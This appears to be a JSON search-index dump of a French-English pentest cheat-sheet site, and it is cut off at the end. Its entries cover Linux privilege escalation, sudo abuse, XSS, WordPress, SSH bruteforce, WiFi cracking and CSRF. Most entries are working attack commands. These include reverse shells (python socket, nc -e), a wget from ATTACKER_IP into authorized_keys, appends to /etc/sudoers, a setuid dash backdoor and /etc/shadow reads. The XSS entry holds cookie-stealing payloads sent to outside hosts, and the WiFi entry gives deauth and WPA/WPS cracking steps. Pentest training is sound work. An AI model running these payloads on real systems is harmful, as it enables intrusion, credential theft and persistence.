	"uri": "/web-pentest/injections/server-side-injections/",
	"title": "Server Side Injections",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/linux-systems/privilege-escalation/system_tricks/",
	"title": "System Tricks",
	"tags": [],
	"description": "",
	"content": " Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://marc.info/?l=full-disclosure\u0026amp;m=128776663124692\u0026amp;w=2# Search for a binary privesc python3 gtfo -b systemctl \nRecon and Enumeration # Look for strange process ps aux # Look for setuid programs (everyone can run them as root) find / -perm -4000 # Example, if perl perl -e ‘$ENV{PATH}=\u0026#34;/usr/bin\u0026#34;;system(\u0026#34;whoami\u0026#34;);’ → root # List processes running as root, permissions and NFS exports echo \u0026#39;services running as root\u0026#39;; ps aux | grep root; echo \u0026#39;permissions\u0026#39;; ps aux | awk \u0026#39;{print $11}\u0026#39;|xargs -r ls -la 2\u0026gt;/dev/null |awk \u0026#39;!x[$0]++\u0026#39;; echo \u0026#39;nfs info\u0026#39;; ls -la /etc/exports 2\u0026gt;/dev/null; cat /etc/exports 2\u0026gt;/dev/null # Get a TTY shell after a reverse shell connection python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; # Set PATH TERM and SHELL if they\u0026#39;re missing export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin export TERM=xterm export SHELL=bash \nTricks Public Keys / SSH # Add public key to authorized keys echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) \u0026gt;\u0026gt; ~/.ssh/authorized_keys # if RSA key is added for 127.0.0.1 you can switch users ssh -i id_rsa root@127.0.0.1 Python sudoers # Add an user to sudoers in python #!/usr/bin/env python import os import sys try: os.system(\u0026#39;echo \u0026#34;username ALL=(ALL:ALL) ALL\u0026#34; \u0026gt;\u0026gt; /etc/sudoers\u0026#39;) except: sys.exit() SSH update-motd # When you login from SSH, welcome message etc are executed from /etc/update-motd.d # Even if you connect in user, scripts are executed with root privileges # If you can write here or in another folder in the PATH, you can force execution # By redifining \u0026#34;date\u0026#34; or \u0026#34;uname\u0026#34; for example # Example, if you can write to /usr/local/bin you can create a backdoored binary here # If the folder is first in the PATH, the backdoored one will be executed first. Escaping Shells # Escaping lshell echo FREEDOM! \u0026amp;\u0026amp; cd () bash \u0026amp;\u0026amp; cd Path variable # Create fake cat echo \u0026#34;/bin/bash\u0026#34; \u0026gt; /tmp/cat chmod 777 /tmp/cat echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin # Update PATH export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin # Go to root cd /root /usr/sbin/cat .flag.txt# listinfo through date binary cd /tmp echo \u0026#34;/bin/sh\u0026#34; \u0026gt; date chmod 777 date echo $PATH export PATH=/tmp:$PATH /usr/bin/listinfo Chrootkit # Chrootkit chrootkit -V # Then Google / MSF Capabilities # Capabilities export PATH=/bin:/sbin:/usr/bin:/usr/sbin:$PATH getcap -r / 2\u0026gt;/dev/null # TAR can read all files, so you can create a tar with a wanted file and than extract it tar -cvf shadow.tar \u0026#34;/etc/shadow\u0026#34; tar -xvf shadow.tar cat etc/shadow Overcome limited shells # Some payloads to overcome limited shells ssh user@$ip nc $localip 4444 -e /bin/sh python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; export TERM=linux # Python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\u0026#34;$ip\u0026#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(), *$ 1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; # Bash echo os.system(\u0026#39;/bin/bash\u0026#39;) /bin/sh -i exec \u0026#34;/bin/sh\u0026#34;; # Perl perl —e \u0026#39;exec \u0026#34;/bin/sh\u0026#34;;\u0026#39;# /bin/dash is the only shell to keep the sticky bit, so if you run as root (included cron, or services running as root): install -mode 4755 /bin/dash /tmp/sh # Then you will have a /tmp/sh that gives any user who calls it root !"
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/",
	"title": "Tools &amp; Methodology",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/misc/url_shortener/",
	"title": "URL Shortener &amp; Redirect",
	"tags": [],
	"description": "",
	"content": " Short URL \u0026amp; Redirections # Get informations about a shortened link https://checkshorturl.com # Find where does redirection go http://redirectdetective.com/ # Get information directly from the creator (bitly for example # Add + at the the end (you can get creation date) https://bit.ly/3b7QP9M https://bit.ly/3b7QP9M+ \nRedirections # These tools allow you to check redirection and resolving path for a given target URL https://redirectdetective.com/ https://wheregoes.com # Lookyloo also gives this kind of information https://lookyloo.circl.lu"
},
{
	"uri": "/web-pentest/applicative-scans/web_application_scan/",
	"title": "Web Application Scans",
	"tags": [],
	"description": "",
	"content": " API Endpoints wordlist https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d  Nikto # For web applications, you can use nikto to identify potential vulnerabilities # Not very stealth # Think about changing the default user agent ! nitko -h http://monsite.com -o output.xml -Format [csv, xml, html, txt] \nWhatweb # Whatweb is another scanning tool for web applications $ whatweb -h $ whatweb -l # Liste les plugins $ whatweb www.monsite.com $ whatweb www.monsite.com -v $ whatweb www.monsite.com -a 1 # Stealhty $ whatweb www.monsite.com -a 3 # Plus aggressif et plus de test faits \nChopChop https://github.com/michelin/ChopChop # ChopChop is a new tool used to scan/test different endpoints. # Its goal is to scan several endpoints and identify exposition of services/files/folders through the webroot. # Easiest usage $ ./gochopchop scan --url https://foobar.com # List plugins $ ./gochopchop plugins $ ./gochopchop plugins --severity High # URL list $ ./gochopchop scan --url-file url_file.txt \nWordpress - wpscan # Scan Wordpress - version docker disponible $ wpscan -h # Scan non intrusif $ wpscan --url http://monsite.com # Enumeration wpscan.rb --url www.example.com --enumerate # Tout wpscan.rb --url www.example.com --enumerate p # Plugins wpscan.rb --url www.example.com --enumerate u # Users # Scan bruteforce les user énumérés avec une wordlist $ wpscan.rb --url www.example.com --wordlist darkc0de.lst --threads 50 \nJoomla - joomlavs # Scan Joomla - version docker disponible $ joomlavs --url www.monsite.com -v # Enumeration $ joomlavs --url www.monsite.com -a # All $ joomlavs --url www.monsite.com -c # Composants $ joomlavs --url www.monsite.com -m # Modules $ joomlavs --url www.monsite.com -t # Templates $ joomlavs --url www.monsite.com -q # Quiet : full passif \nSSL weakness # Scanner 1 testssl https://monsite.com # Scanner 2 sslscan https://domain.fr \nOnionscan https://github.com/s-rah/onionscan"
},
{
	"uri": "/wireless/wifi_cracking/",
	"title": "WiFi Cracking",
	"tags": [],
	"description": "",
	"content": " General Informations # Bypass MAC filter macchanger –m B0:D0:9C:5C:EF:86 wlan0 \nMonitoring, Recon and Dumping # Using the aircrack-ng suite # Turning on the monitor mode sudo airmon-ng start wlan0mon # Simple passive listening and capture # Used to discover AP in the environment sudo airodump-ng wlan0mon # Targetted listening and capture # Focus on one AP and one channel sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c 1 –w outfile \nAttacking WEP # WEP is an old encryption protocol but still used in some places # It is vulnerable to direct cracking attacks # The only requirement is to get enough IV # The process can be enhanced by sending deauth packets # -0 == detauth attack, sending 3 packets (can be increased) aireplay-ng -0 3 -a \u0026lt;TARGET_AP_MAC\u0026gt; wlan0mon -w # Another possibility is to use fake authentication to generate IV # -1 = fake authentication # 0 = delay between association demands # -e = AP ESSID (name) # -a = AP MAC # -h = attacker MAC aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon # ARP Sniffing and injection is another method aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon # Using aircrack-ng it is possible to directly crack the WEP Key aircrack-ng outfile -w wordlist \nAttacking WPA2 PSK (The old way) # Using the aircrack-ng suite # You can first focus one AP using airodump-ng (see monitoring section) # Here, you want to get the 4-way WPA Handshake # It requires network traffic between the AP and one device # Dumping sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c 1 –w outfile # Deauth connected devices to initiate authentication process and try to get the handshake aireplay-ng --deauth 15 -a \u0026lt;TARGET_AP_MAC\u0026gt; wlan0mon aireplay-ng -0 15 -a \u0026lt;TARGET_AP_MAC\u0026gt; wlan0mon # In the airodump-ng console, the WPA handshake will appear once captured# Cracking can be done using aircrack-ng aircrack-ng outfile -w wordlist # But also using other tools like hashcat # The outfile needs to be an HCCAPX file # Hashcat utils provide a binary to convert .\\cap2hccapx.exe WPA2_test.cap-01.cap WPA2_test.hccapx # Then you can crack it like a normal hash (see hashcat section) .\\hashcat64.exe -m 2500 WPA2_test.hccapx wordlist.txt --force -O \nAttacking WPA2 using PMKID # You don\u0026#39;t need any network traffic # Using hcxtools and hcxdumptool # Monitor mode sudo airmon-ng start wlan0mon # PMKID capture # It can take a while to capture PKMID (several minutes++) # If an AP recieves our association request packet and supports sending sudo hcxdumptool -i wlan0mon -o outfile.pcapng --enable_status=1 # Then convert the captured data to a suitable format for hashcat # -E retrieve possible passwords from WiFi-traffic (additional, this list will include ESSIDs) # -I retrieve identities from WiFi-traffic # -U retrieve usernames from WiFi-traffic sudo hcxpcaptool -E essidlist -I identitylist -U usernamelist -z test.16800 test.pcapng # Then, you can use hashcat to crack it (see hashcat section) ./hashcat -m 16800 test.16800 -a 3 -w 3 \u0026#39;?l?l?l?l?l?lt!\u0026#39; \nAttacking WPS (WiFi Protected Setup) # Reaver Attack # Online bruteforcing of the WPS 8-digits PIN # Kinda old and can be obsolete nowadays, but still usable # Reaver integrated dumping tool (can also airodump-ng) # Wash gives information about WPS being locked or not # Locked WPS will have less success chances wash -i wlan0mon # Launching reaver reaver -i wlan0mon -c 6 -b 00:23:69:48:33:95 -vv # Some manufacturers have implemented protections # You can try different switches to bypass # -L = Ignore locked state # -N = Don\u0026#39;t send NACK packets when errors are detected # -d = delay X seconds between PIN attempts # -T = set timeout period to X second (.5 means half second) # -r = After X attemps, sleep for Y seconds reaver -i mon0 -c 6 -b 00:23:69:48:33:95 -vv -L -N -d 15 -T .5 -r 3:15# Pixie-Dust Attack # Done with Reaver + PixieWPS # This attack is based on seed / false random # Start reaver, we need the PKE, PKR, e-hash 1 \u0026amp; e-hash 2, E-nonce / R-nonce # and the authkey from Reaver to use for pixiewps reaver -i wlan0mon -c 6 -b 00:23:69:48:33:95 -vv -S # Now using pixiexps, you can crack PIN offline pixiewps -e \u0026lt;pke\u0026gt; -r \u0026lt;pkr\u0026gt; -s \u0026lt;e-hash1\u0026gt; -z \u0026lt;e-hash2\u0026gt; -a \u0026lt;authkey\u0026gt; -n \u0026lt;e-nonce\u0026gt; # Then, you can use the PIN with reaver to get to cleartext password reaver -i \u0026lt;monitor interface\u0026gt; -b \u0026lt;bssid\u0026gt; -c \u0026lt;channel\u0026gt; -p \u0026lt;PIN\u0026gt; \nBettercap Pwning (https://www.bettercap.org/modules/) # Deauth and 4-way handshake attack sudo bettercap -iface wlan0 # Start the monitoring mode \u0026gt; wifi.recon on # Set the AP sorting by clients number \u0026gt; set wifi.show.sort clients desc # Every 1 sec, clear view and display an updated one \u0026gt; set ticker.commands \u0026#39;clear; wifi.show\u0026#39; \u0026gt; ticker on # Set the target channel \u0026gt; wifi.recon.channel 1 # Initiate deauth packets \u0026gt; wifi.deauth e0:xx:xx:xx:xx:xx # Convert /path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx # Cracking /path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx \u0026#39;?d?d?d?d?d?d?d?d\u0026#39;# Client-less PMKID Attack # PMKID = HMAC-SHA1-128(PMK, \u0026#34;PMK Name\u0026#34; | MAC_AP | MAC_STA) sudo bettercap -iface wlan0 # Start the monitoring mode \u0026gt; wifi.recon on # As long as the PMK is constant, we just need to get one to initiate attack # Instead of deauth others, we will associate to the AP and listen which one # Send good informations # wifi.assoc supports \u0026#39;all\u0026#39; (or `*`) or a specific BSSID, just like wifi.deauth \u0026gt; wifi.assoc all # Convert /path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap # Cracking /path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid \u0026#39;?d?d?d?d?d?d?d?d\u0026#39;"
},
{
	"uri": "/web-pentest/content-management-system-cms/wordpress/",
	"title": "Wordpress",
	"tags": [],
	"description": "",
	"content": " General \u0026amp; Tricks # Username can be guessed on WordPress since the username will generate a different error message if it doesn\u0026#39;t exist. # Interesting files https://monsite.com/robots.txt https://monsite.com/feed https://monsite.com/readme.html https://monsite.com/xmlrpc.php # Configuration files https://monsite.com/.htaccess https://monsite.com/wp-config.php # Directory listing https://monsite.com/wp-includes # XML-RPC attack (https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit) # You can bruteforce users ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username1 # If by any way you can upload files, go check /upload or /uploads for your files # Get WPEngine\u0026#39;s config file /_wpeprivate/config.json \nScanning and enumeration # Enumerate users Users can be found using ?author=XXX # You can also use this using /wp-json/wp/v2/users, then iterate that way /wp-json/wp/v2/users/1 # If /?author=1 is 403 Forbidden, you can bypass it # If the .htaccess blocks \u0026#34;?author\u0026#34; # Bypass 1 : http://xxx.fr/?x\u0026amp;author=1 --\u0026gt; http://xxx.fr/author/chris/?x # Bypass 2 : http://lictor.fr/index.php?author=1 # Another way /wp-json/?rest_route=/wp/v2/users# WPScan is a great automatic tool (you can dockerise) docker pull wpscanteam/wpscan docker run -it --rm wpscanteam/wpscan -u https://yourblog.com [options] # Non intrusive scan wpscan.rb --url www.example.com # Bruteforce users found using 50 threads wpscan.rb --url www.example.com --wordlist darkc0de.lst --threads 50 # Bruteforce on one user wpscan.rb --url www.example.com --wordlist darkc0de.lst --username admin # Plugins enumeration wpscan.rb --url www.example.com --enumerate p # Users enumeration wpscan.rb --url www.example.com --enumerate u \nReverse Shell # You can reverse shell by editing templates (404.php, footer.php...)"
},
{
	"uri": "/web-pentest/injections/client-side-injections/xss/",
	"title": "XSS Injections",
	"tags": [],
	"description": "",
	"content": " Resources https://html5sec.org/ https://gbhackers.com/top-500-important-xss-cheat-sheet/ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot https://github.com/s0md3v/AwesomeXSS/ \nTips # If XSS is not executed through the UI, you can try to insert it through the API # It can then fire on the UI. Many filters are not present like this \nBasic Stored XSS # Setup simple server python -m SimpleHTTPServer 8080 # Test wget -O- http://$(wget -qO- icanhazip.com):8080/lol # Exploit \u0026lt;script\u0026gt;document.location(\u0026#39;http://IP_EXTERNE/\u0026#39;+document.cookie)\u0026lt;/script\u0026gt; \nPayloads # Document.location \u0026lt;script\u0026gt;document.location('http://IP_EXTERNE/'+document.cookie)\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;document.location.href = 'http://requestb.in/XXXXXX?cookies =' + document.cookie;\u0026lt;/script\u0026gt; # Window \u0026lt;script\u0026gt;window.open(\u0026quot;http://monserveur/Cookie=\u0026quot;+document.cookie)\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;window.location='http://monsite.free.fr/script.php?cookies='+(document.cookie);\u0026lt;/script\u0026gt; # Document.write \u0026lt;script\u0026gt;document.write('\u0026lt;img src=\u0026quot;https://requestb.in/xxxxx?cookie=\u0026quot;+document.cookie\u0026gt;admin\u0026lt;/img\u0026gt;');\u0026lt;/script\u0026gt; admin\u0026quot;\u0026gt;\u0026lt;/i\u0026gt;)\u0026lt;/span\u0026gt;\u0026lt;script\u0026gt;document.write(\u0026quot;\u0026lt;img src=http://requestb.in/XXXXX?cookie=\u0026quot;.concat(encodeURI(document.cookie)).concat(\u0026quot;/\u0026gt;\u0026quot;))\u0026lt;/script\u0026gt;\u0026lt;i\u0026gt; \u0026lt;script\u0026gt;var xhr = new XMLHttpRequest();xhr.open('POST', 'http://requestb.in/w0sw22w0', true);xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xhr.send(document.cookie);\u0026lt;/script\u0026gt; # alert(1) in JS \u0026lt;object data=\u0026quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\u0026quot;\u0026gt;\u0026lt;/object\u0026gt; injecting inside of input tags \u0026lt;input/onfocus=alert(0) autofocus\u0026gt; \u0026lt;input/onfocus=alert`0` autofocus\u0026gt; \u0026lt;input/onfocus=prompt`0` autofocus\u0026gt; 1'\u0026quot;\u0026gt;\u0026lt;input/onfocus={alert`1`} autofocus\u0026gt;  # WAF Bypass '';!--\u0026quot;\u0026lt;XSS\u0026gt;=\u0026amp;{()} \u0026lt;IMG SRC=\u0026quot;javascript:alert('XSS');\u0026quot;\u0026gt; \u0026lt;IMG SRC=\u0026quot;jav\u0026amp;#x09;ascript:alert('XSS');\u0026quot;\u0026gt; \u0026lt;IMG SRC=\u0026quot;jav\u0026amp;#x0A;ascript:alert('XSS');\u0026quot;\u0026gt; \u0026lt;IMG SRC=\u0026quot;jav\u0026amp;#x0D;ascript:alert('XSS');\u0026quot;\u0026gt; \u0026lt;INPUT TYPE=\u0026quot;IMAGE\u0026quot; SRC=\u0026quot;javascript:alert('XSS');\u0026quot;\u0026gt; \u0026lt;svg/onload=(((confirm(1))))\u0026gt; confirm() confirm`` (confirm``) {confirm``} [confirm``] (((confirm)))`` co\\u006efirm() new class extends confirm``{} [8].find(confirm) [8].map(confirm) [8].some(confirm) [8].every(confirm) [8].filter(confirm) [8].findIndex(confirm) # No HTML events \u0026lt;script\u0026gt;alert(1)// \u0026lt;script\u0026gt;alert(1)\u0026lt;!-- \u0026lt;script\u0026gt;alert(1)%0A--\u0026gt; \u0026lt;script src=data:,alert(1)\u0026gt; \u0026lt;script src=//HOST/FILE\u0026gt; \u0026lt;script src=https:DOMAIN/FILE\u0026gt; \u0026lt;svg\u0026gt;\u0026lt;script xlink:href=//HOST/FILE\u0026gt; \u0026lt;svg\u0026gt;\u0026lt;script xlink:href=https:DOMAIN/FILE\u0026gt; \u0026lt;svg\u0026gt;\u0026lt;script xlink:href=data:,alert(1)\u0026gt; \u0026lt;svg/onload=(confirm(1))\u0026gt; \u0026lt;svg/onload=confirm(1)\u0026gt; # Stealing the source code without triggering browser restrictions \u0026lt;svg/onload=\u0026quot;(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML\u0026quot;\u0026gt;  # Non alphanumeric alert() payload Ð=[],Ř=+!+Ð,ˍ=Ř+Ř+Ř,Š=!!Ð+Ð,Ť=!Ð+Ð,Ǎ=(!Ð+{})[Ř+[+Ð]],Č=(Ð+{})[Ř],Ȟ=Š[Ř],Ě=Š[+Ð],_=Ť[ˍ]+Č+Ȟ+Ě,ǰ=Ð[_]+Ð,š=Ð[Ð]+Ð,Ð[_][Ǎ+Č+(š)[Ř]+Ť[ˍ]+Ě+Ȟ+(š)[+Ð]+Ǎ+Ě+Č+Ȟ](Ť[Ř]+Ť[Ř+Ř]+Š[ˍ]+Ȟ+Ě+ǰ[Ř+[ˍ]]+ǰ[Ř+[ˍ+Ř]])()  XSStrike https://github.com/s0md3v/XSStrike # Cross Site Scripting detection suite equipped with parsers # XSStrike analyses the response with multiple parsers and then crafts payloads # that are guaranteed to work by context analysis integrated with a fuzzing engine # Documentation https://github.com/s0md3v/XSStrike/wiki/Usage # Classical GET python xsstrike.py -u \u0026#34;http://example.com/search.php?q=query\u0026#34; # POST python xsstrike.py -u \u0026#34;http://example.com/search.php\u0026#34; --data \u0026#34;q=query\u0026#34; # Path payloads python xsstrike.py -u \u0026#34;http://example.com/search/form/query\u0026#34; --path # Crawl and test python xsstrike.py -u \u0026#34;http://example.com/page.php\u0026#34; --crawl # Load payloads from file and test them python3 xsstrike.py -u \u0026#34;http://example.com/page.php?q=query\u0026#34; -f /path/to/file.txt # Find hidden parameters python xsstrike.py -u \u0026#34;http://example.com/page.php\u0026#34; --params"
},
{
	"uri": "/network/services-enumeration/22_ssh/",
	"title": "22 - SSH",
	"tags": [],
	"description": "",
	"content": " Recon # Banner grabbing using telnet telnet IP 22 \nBruteforce # List of users using wordlists hydra -L users.txt -P \u0026lt;passwordList\u0026gt; -t 3 -s port \u0026lt;IP\u0026gt; ssh # Only one user and wordlist passwords hydra -l root -P \u0026lt;passwordList\u0026gt; -t 3 -s port \u0026lt;IP\u0026gt; ssh \nOpenSSL # Connection through openssl openssl s_client -connect IP:PORT"
},
{
	"uri": "/cryptography/aes/",
	"title": "AES Encryption",
	"tags": [],
	"description": "",
	"content": " Retrieve AES Key and mount partition # Dump AES key aeskeyfind dump # Result 8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1 # Mount partition echo 8d3f527de514872f595908958dbc0ed1 | xxd -r -p \u0026gt; key.bin sudo cryptsetup luksFormat --verify-passphrase --cipher=aes-ecb --hash=sha1 --key-size=128 --master-key-file=key.bin dump sudo cryptsetup luksOpen dump test sudo mount -t ext4 /dev/mapper/test /mnt/media sudo ls /mnt/media/dir2 \nDecipher encrypted aes256cbc file using openssl # Key d49af309a4c69382ff07bc6f83ba4c2595a7f086d3e5b69e119e2337cb75172d\u0026#39; ----\u0026gt; SHA-256 de \u0026#39;mcsTnTld1dDn\u0026#39;: # Decipher openssl enc -aes-256-cbc -d -in Confidentiel.jpg.enc -out Confidentiel.jpg -iv \u0026#39;0000000000000000\u0026#39; -K \u0026#39;d49af309a4c69382ff07bc6f83ba4c2595a7f086d3e5b69e119e2337cb75172d\u0026#39;"
},
{
	"uri": "/linux-systems/privilege-escalation/abusing_sudo_rights/",
	"title": "Abusing Sudo Rights",
	"tags": [],
	"description": "",
	"content": " Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://gtfobins.github.io/ \nCVE 2019-14287 # Exploitable when a user have the following permissions (sudo -l) (ALL, !root) ALL # If you have a full TTY, you can exploit it like this sudo -u#-1 /bin/bash # If no TTY, you can restart SSH server and add your key sudo /etc/init.d/ssh restart echo \u0026#39;ssh-rsa AAAA[...snip...]fd48as= root@kali-jms\u0026#39; \u0026gt; authorized_keys sudo -u#-1 bash \nExploiting sudo    Binary program Commands Infos     apache2 sudo apache2 -f /etc/shadow # You will get an error and it will # display first line   apt-get sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh    awk sudo awk \u0026lsquo;BEGIN {system(\u0026ldquo;/bin/sh\u0026rdquo;)}\u0026rsquo;    ed sudo /usr/bin/ed !/bin/sh    find sudo find /etc/passwd -exec /bin/sh \\; sudo find /bin -name nano -exec /bin/sh \\;    ftp sudo ftp ftp\u0026gt; /!/bin/bash    gdb sudo -u user gdb -q (gdb) shell    git # Method 1 sudo -u user git -c core.pager=/tmp/script.sh \u0026ndash;paginate help # Method 2 sudo git help add !/bin/bash # Method 1 Create script.sh and chmod 777 → /bin/bash \u0026gt;\u0026amp;2 0\u0026gt;\u0026amp;2 # Method 2 You can also use the help add feature   ht export TERM=xterm-color sudo ht /etc/sudoers # F3 to open the file, then update lines  ALL=(ALL) NOPASSWD: ALL    less sudo less /etc/hosts !sh    man sudo man man !sh    more sudo more /etc/hosts !sh    mount sudo mount -o bind /bin/bash /bin/mount sudo mount    mysql sudo mysql -e \u0026lsquo;!/bin/sh\u0026rsquo;    nano sudo nano /etc/passwd # You can then add a new root user openssl passwd -1 -salt user3 pass123 # /etc/passwd user3::0:0:root:/root:/bin/bash   nmap # Method 1 sudo nmap \u0026ndash;interactive nmap\u0026gt; !sh # Method 2 echo \u0026ldquo;os.execute(\u0026lsquo;/bin/sh\u0026rsquo;)\u0026rdquo; \u0026gt; /tmp/shell.nse \u0026amp;\u0026amp; sudo nmap \u0026ndash;script=/tmp/shell.nse # Method 1 # Using \u0026ndash;interactive option # Method 2 # Using \u0026ndash;script option   pico sudo -u user pico # Type bash in editor an press ^T to # trigger spellchecker   pip python -m SimpleHTTPServer 80 wget http://192.168.1.134/setup.py sudo pip install . \u0026ndash;upgrade \u0026ndash;force-reinstall # You can use FakePip https://github.com/0x00-0x00/FakePip.git # Decode and change IP adress   rbash echo $SHELL echo $PATH export SHELL=/bin/bash:$SHELL export PATH=/usr/bin:$PATH vi :!/bin/bash    rvim rvim version grep python echo “import os;os.system(\u0026lsquo;bash\u0026rsquo;)” \u0026gt; /tmp/script.py sudo -u rvim -c \u0026ldquo;pyfile /tmp/script.py\u0026rdquo;   scp sudo -u user scp -vv -C -S tmp/script.sh a whatever # Create script.sh and chmod 777 → /bin/bash \u0026gt;\u0026amp;2 0\u0026gt;\u0026amp;2   script sudo -u user script /tmp/what-ever    ssh sudo -u user ssh -o ProxyCommand=/tmp/script.sh lel # Create script.sh and chmod 777 → /bin/bash \u0026gt;\u0026amp;2 0\u0026gt;\u0026amp;2   strace / sysud64 sudo strace -o/dev/null /bin/bash sudo sysud64 -o/dev/null /bin/bash    tar # Method 1 sudo -u user tar \u0026ndash;checkpoint=1 \u0026ndash;checkpoint-action=exec=/bin/bash -cf /tmp/12345.tar /dev/zero # Method 2 cd /tmpcp /bin/bash . sudo chown root:root /tmp/bash sudo mv /bin/tar /bin/tar.bak sudo mv /tmp/bash /bin/tar sudo /bin/tar    tcpdump echo $’id\\ncat /etc/shadow’ \u0026gt; /tmp/.test chmod +x /tmp/.test sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root    teehee echo \u0026ldquo;raaj::0:0:::/bin/bash\u0026rdquo; sudo teehee -a /etc/passwd   vim sudo vim -c \u0026lsquo;!sh\u0026rsquo;    wget sudo wget http://ip/filePasswd -O /etc/passwd su user1 # Attacker side # Copy target\u0026rsquo;s file /etc/passwd # Add a new user and host the fil   zip # Method 1 touch /tmp/xyz; chmod 444 /tmp/xyz sudo -u user zip /tmp/zzz.zip /tmp/xyz -T -TT /tmp/script.sh # Method 2 touch raj sudo zip /tmp/nisha.zip /home/zico/raj -T \u0026ndash;unzip-command=\u0026ldquo;sh -c /bin/bash\u0026rdquo; # Create script.sh and chmod 777 → /bin/bash \u0026gt;\u0026amp;2 0\u0026gt;\u0026amp;2    "
},
{
	"uri": "/web-pentest/applicative-scans/",
	"title": "Applicative Scans",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/web-pentest/applicative-scans/aquatone/",
	"title": "Aquatone",
	"tags": [],
	"description": "",
	"content": " Aquatone # Aquatone is a complete tool separate in three commands to make complete recon # Collector modules : # Dictionary brute force # DNSDB.org # Google Transparency Report # HackerTarget # Netcraft # Shodan (API key needed) # ThreatCrowd # VirusTotal (API key needed) # PHASE 1 : Discovery # aquatone-discover is the first step # It uses name servers and performs some test to see if wildcard is configured # Then it asks each subdomain collector for potential subdomain # Then it tries to resolve them to see which ones are up and creates the hosts.txt file aquatone-discover -d domain.com # PHASE 2 : Scanning # aquatone-scan will try to find which subdomains serve web content # By default it will scan 80, 443, 8000, 8080 and 8443 but you can specify ports with --ports or pre-configured aliases (small, medium, large, huge) # It creates open_ports.txt and urls.tx # PHASE 3 : Gathering # aquatone-gather can collect HTTP response and screenshots # It uses Nightmare tool to do that # It creates headers, html, report and screenshots folder \nCLI Tricks # Get server technology stats (headers folder) cat * | grep \u0026#39;Server:\u0026#39; | sort | uniq -c | sort -nr # Find more subdomains (html folder) cat * | egrep -o \u0026#39;[a-z0-9\\-\\_\\.]+\\.corp\\.yahoo\\.com\u0026#39; | sort -u # Find HTML comments (html folder) cat * | egrep -o \u0026#39;\u0026lt;!--.*--\u0026gt;\u0026#39; # Find pages with password field (html folder) grep \u0026#39;type=\u0026#34;password\u0026#34;\u0026#39; * # Get hosts listening on port 443 cat open_ports.txt | grep \u0026#39;,443\u0026#39; | cut -d \u0026#34;,\u0026#34; -f 1 # Check HTTPS hosts for Heartbleed grep https urls.txt | cut -d \u0026#39;/\u0026#39; -f 3 \u0026gt; /tmp/targets.lst sslscan --targets=/tmp/targets.lst --no-ciphersuites --no-fallback --no-renegotiation --no-compression --no-check-certificate"
},
{
	"uri": "/web-pentest/injections/client-side-injections/csrf/",
	"title": "CSRF Injections",
	"tags": [],
	"description": "",
	"content": " Basic CSRF 0 protection # Basic form \u0026lt;form name=\u0026#34;pls\u0026#34; action=\u0026#34;https://xxx.fr/index.php?action=profile\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label\u0026gt;Username:\u0026lt;/label\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34; value=\u0026#34;devsid\u0026#34; type=\u0026#34;text\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br\u0026gt;\t\u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label\u0026gt;Status:\u0026lt;/label\u0026gt; \u0026lt;input name=\u0026#34;status\u0026#34;checked=\u0026#34;checked\u0026#34; type=\u0026#34;checkbox\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br\u0026gt;\t\u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script 